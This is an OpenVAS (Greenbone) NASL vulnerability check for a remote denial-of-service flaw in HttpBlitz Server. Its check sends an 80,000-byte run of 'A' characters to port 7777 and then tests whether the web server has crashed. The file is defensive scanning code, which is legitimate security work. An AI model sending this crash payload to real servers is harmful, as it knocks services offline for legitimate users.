###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_HttpBlitz_45573.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# HttpBlitz Server HTTP Request Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100949");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)");
  script_bugtraq_id(45573);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("HttpBlitz Server HTTP Request Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_require_ports("Services/www", 7777);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45573");
  script_xref(name:"URL", value:"http://www.sourceforge.net/projects/httpblitz/");

  script_tag(name:"summary", value:"HttpBlitz Server is prone to a remote denial-of-service vulnerability.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to cause the application to crash,
  denying service to legitimate users.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:7777 );

banner = get_http_banner( port:port );
if( ! banner || "Server:" >< banner ) exit( 0 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

if( ! soc = open_sock_tcp( port ) ) exit( 0 );

ex = crap( data:raw_string( 0x41 ), length:80000 );
send( socket:soc, data:string( ex, "\r\n" ) );

sleep( 2 );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
